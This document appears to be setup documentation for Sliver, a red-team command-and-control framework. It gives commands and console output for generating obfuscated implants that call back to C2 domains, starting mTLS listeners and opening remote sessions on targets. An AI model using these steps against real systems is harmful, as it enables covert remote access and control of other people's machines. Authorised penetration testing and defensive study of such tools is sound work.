## Server Setup

The server supports Linux, Windows, and MacOS however we recommend running the server on a Linux host, some features may be more difficult to get working on a Windows or MacOS server but all basic built-in functionality should work fine.

Download the latest [release](https://github.com/BishopFox/sliver/releases) for your platform, and just run the binary. The first time you run the server it'll need to unpack some assets, which may take a minute or two, subsequent start ups should be faster.

__NOTE:__ Sliver has two external dependancies for optional features: MinGW and Metasploit. To enable shellcode/staged payloads you need to install MinGW. To enable MSF integrations you'll need Metasploit installed.

The `Dockerfile` build of Sliver is mostly designed to run the unit tests but includes both MinGW and Metasploit. If you plan to run the server using Docker you'll need to forward the appropriate TCP ports (e.g. 80, 443, 31337) yourself.


### MinGW Setup

In order to enable shellcode/staged/DLL payloads you'll need to install MinGW on the server (clients connecting to the server do not need it installed). By default Sliver will look in the usual places for MinGW binaries but you can override this using the [environment variable](https://github.com/BishopFox/sliver/wiki/Environment-Variables) `SLIVER_CC`.

#### Linux

```
apt-get install mingw-w64 binutils-mingw-w64 g++-mingw-w64
```

#### MacOS

```
brew install mingw-w64
```

### Metasploit Setup

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects version 5 or later.

## Generating Implants

Generating implants is done using the `generate` command, you must specify at least one C2 endpoint using `--mtls`, `--http`, or `--dns`. Note that when an implant attempts to connect to an endpoint specified using `--http` it will try both HTTPS and then HTTP (if HTTPS fails). We recommend using mutual TLS (`--mtls`) whenever possible. You can also specify an output directory with `--save`, by default the implant will be saved to the current working directory.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop

[*] Generating new windows/amd64 Sliver binary
[*] Symbol obfuscation is enabled, this process takes about 15 minutes
[*] Build completed in 00:10:16
[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

__IMPORTANT:__ The symbol obfuscation process can take 15+ mintues to complete depending on your server's CPU resources. You can skip this step with `--skip-symbols` but a lot of sketchy information will end up in the binaries that get generated. You should only use this flag if you're just playing around, or do not care about stealth.

Sliver implants are cross-platform, you can change the compiler target with the `--os` flag:

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --skip-symbols --os mac

[*] Generating new darwin/amd64 Sliver binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:00:03
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

The server will also assign codenames to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these codenames will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `slivers` command:

```
sliver > slivers

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

If you need to re-download a previously generated implant use the `regenerate` command:

```
sliver > regenerate --save /Users/moloch/Desktop/ NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```


## Getting Shells

Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, and `dns` to start listeners for each protocol (`http` is also used for HTTPS). You can use the `jobs` command to view and manage listeners running in the background.

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

In this example we're using Mutual TLS, the required certificates for setting up and securing this connection have already been generated in the background and the client certificate pair was embedded into the implant at compile-time. So to get a shell you just have to run the binary on the target.

```
[*] Session #1 PROPER_ANTHONY - 127.0.0.1:49929 (narvi.local) - darwin/amd64

sliver > use 1

[*] Active sliver PROPER_ANTHONY (1)

sliver (PROPER_ANTHONY) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
PROPER_ANTHONY            6.3 MiB
```


## Multiple Domains/Protocols

You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protcolts first (MTLS -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.

```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

